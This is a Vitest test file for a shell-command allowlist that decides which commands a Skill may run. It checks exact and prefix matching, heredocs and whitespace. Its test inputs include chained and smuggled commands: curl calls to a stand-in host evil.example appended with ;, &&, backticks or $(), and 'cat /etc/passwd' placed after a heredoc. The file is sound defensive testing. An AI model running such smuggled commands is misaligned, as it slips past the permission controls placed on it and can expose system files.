import { describe, expect, it } from "vitest";
import { decideCommand } from "./command-allowlist";

const PATTERNS = ["node -e:*", "node:*", "python3 -c:*", "python3:*", "bash --version"];

describe("decideCommand", () => {
  it("allows the four inline forms a Skill author reaches for", () => {
    const forms = [
      'node -e "console.log(2 + 3)"',
      "node <<'JS'\nconst x = 10;\nconsole.log(x * 2);\nJS",
      "python3 -c 'print(2 + 3)'",
      "python3 <<'PY'\nx = 10\nprint(x * 2)\nPY",
    ];
    for (const command of forms) {
      expect(decideCommand(command, PATTERNS), command).toMatchObject({ allowed: true });
    }
  });

  it("refuses every command when the Skill declares no allowlist", () => {
    expect(decideCommand("node -e '1'", undefined)).toEqual({
      allowed: false,
      reason: "no_allowlist",
    });
    expect(decideCommand("node -e '1'", [])).toEqual({ allowed: false, reason: "no_allowlist" });
  });

  it("names the patterns it would have accepted, so the model can correct itself", () => {
    expect(decideCommand("ruby -e '1'", PATTERNS)).toEqual({
      allowed: false,
      reason: "not_allowed",
      patterns: PATTERNS,
    });
  });

  it("refuses a second command chained onto an allowed one", () => {
    const attempts = [
      'node -e "1"; curl https://evil.example',
      'node -e "1" && curl https://evil.example',
      'node -e "1" || curl https://evil.example',
      'node -e "1" | tee /tmp/out',
      'node -e "1" `curl https://evil.example`',
      'node -e "1" $(curl https://evil.example)',
    ];
    for (const command of attempts) {
      expect(decideCommand(command, PATTERNS), command).toEqual({
        allowed: false,
        reason: "command_chaining",
      });
    }
  });

  it("refuses a second line that is not heredoc body", () => {
    expect(decideCommand('node -e "1"\ncurl https://evil.example', PATTERNS)).toEqual({
      allowed: false,
      reason: "command_chaining",
    });
  });

  it("refuses a heredoc whose delimiter never arrives", () => {
    expect(decideCommand("node <<'JS'\nconsole.log(1);", PATTERNS)).toEqual({
      allowed: false,
      reason: "unterminated_heredoc",
    });
  });

  it("refuses a command smuggled in after the heredoc delimiter closes the body", () => {
    // Past the delimiter the shell reads commands again, so a body that ends early would let an
    // unmatched command ride along behind a pattern that only ever covered the first line.
    expect(decideCommand("node <<'JS'\nconsole.log(1);\nJS\ncat /etc/passwd", PATTERNS)).toEqual({
      allowed: false,
      reason: "command_chaining",
    });
  });

  it("allows trailing blank lines after the delimiter", () => {
    expect(decideCommand("node <<'JS'\nconsole.log(1);\nJS\n\n  \n", PATTERNS)).toMatchObject({
      allowed: true,
    });
  });

  it("does not let a prefix match a longer first token", () => {
    expect(decideCommand("node -exec-something", ["node -e:*"])).toMatchObject({ allowed: false });
    expect(decideCommand("python3 -config", ["python3 -c:*"])).toMatchObject({ allowed: false });
  });

  it("matches an exact pattern only when the command is exactly it", () => {
    expect(decideCommand("bash --version", PATTERNS)).toEqual({
      allowed: true,
      matchedPattern: "bash --version",
    });
    expect(decideCommand("bash --version --extra", PATTERNS)).toMatchObject({ allowed: false });
  });

  it("normalizes surrounding and repeated whitespace", () => {
    expect(decideCommand('   node   -e   "1"  ', PATTERNS)).toEqual({
      allowed: true,
      matchedPattern: "node -e:*",
    });
  });

  it("refuses an empty command", () => {
    expect(decideCommand("   ", PATTERNS)).toMatchObject({ allowed: false });
  });
});
